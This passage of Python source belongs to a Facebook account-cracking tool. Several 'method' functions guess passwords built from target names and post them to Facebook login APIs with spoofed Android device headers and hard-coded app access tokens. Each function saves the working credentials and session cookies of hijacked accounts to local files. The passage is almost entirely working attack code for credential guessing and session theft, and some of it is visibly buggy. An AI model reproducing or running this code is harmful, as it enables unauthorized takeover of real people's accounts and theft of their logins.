'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        en = random.choice(['en_US','en_GB'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers=headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'ps_l=0; ps_n=0; datr=c1gBZhAba_jwSo7k7IG_M5ai; sb=c1gBZsEMppKpHWq5MDy02nKL; m_pixel_ratio=2.225780963897705; wd=486x949; fr=00f5SJiM5ByArVWvt..BmAVhz..AAA.0.0.BmAViS.AWUrjogErsc',
    'dpr': '2.75',
    'referer': 'https://www.google.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2004J19C"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
                        url = 'https://b-graph.facebook.com/auth/login'                
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ANKIT-OK] '+ids+' | '+pas+' | ' + joined(coki) + '\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break                     
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ANKITCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
		        time.sleep(20)        
        except Exception as e:
                pass
#------------[ METHOD 5 ]--------------#
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [BRAND-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        en = random.choice(['en_US','en_GB'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [BRAND-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/BRAND-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BRAND-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[BRAND-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#------------[ METHOD 6 ]--------------#		
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [BRAND-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': SIX(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			BRAND=session.cookies.get_dict().keys()
			if "c_user" in BRAND:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [BRAND-OK] %s | %s'%(ids,pas))
				open('/sdcard/BRAND-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in BRAND:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#------------[ METHOD 7 ]--------------#
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [BRAND-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': SEVEN(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			BRAND=session.cookies.get_dict().keys()
			if "c_user" in BRAND:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [BRAND-OK] %s | %s'%(ids,pas))
				open('/sdcard/BRAND-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in BRAND:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#------------[ METHOD 8 ]--------------#
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [BRAND-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': EIGHT(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			BRAND=session.cookies.get_dict().keys()
			if "c_user" in BRAND:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [BRAND-OK] %s | %s'%(ids,pas))
				open('/sdcard/BRAND-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in BRAND:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [BRAND-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/BRAND-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1
#------------[ RANDOM 1 ]--------------#
#------------[ THIS RANDOM IS BULL SHIT  ]--------------#
#------------[ I PROVIDE WORKING RANDOM METHOD IN LAST DONT USE THIS  ]--------------#
#------------[ BULL SHITTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT ]--------------#
def ANKIT1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.97,width=720,height=1612};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '45204',
'X-FB-SIM-HNI': '45201',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '698'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [ANKIT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ANKIT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [ANKIT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ANKIT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#------------[ THIS RANDOM IS BULL SHIT  ]--------------#
def ANKIT2(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			phone_company = __iam_genius.split('|')[1]
			dimensions = __iam_genius.split('|')[2]
			ffb=random.choice(fbks)
			dvlk = random.choice(usr)
			#1 method issue es ma ha
			ua_string = 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X690B Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/236.0.0.24.108;FBBV/405428495;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X690B;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.97,width=720,height=1612};FB_FW/1;]'
			device_family_id = str(uuid.uuid4())
			adid = str(uuid.uuid4())
			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
			data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_PK',
				'client_country_code':'PK',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'api_key': '8114af471d039628db5c68cb127af936',
				'user-agent':ua_string,
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
			url = 'https://b-api.facebook.com/method/auth.login'
			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
			q = json.loads(po)
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [ANKIT-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/ANKIT-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/ANKIT-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except Exception as e:
		print(e)
 #------------[ THIS RANDOM IS BULL SHIT  ]--------------#               
def ANKIT3(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
                               
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
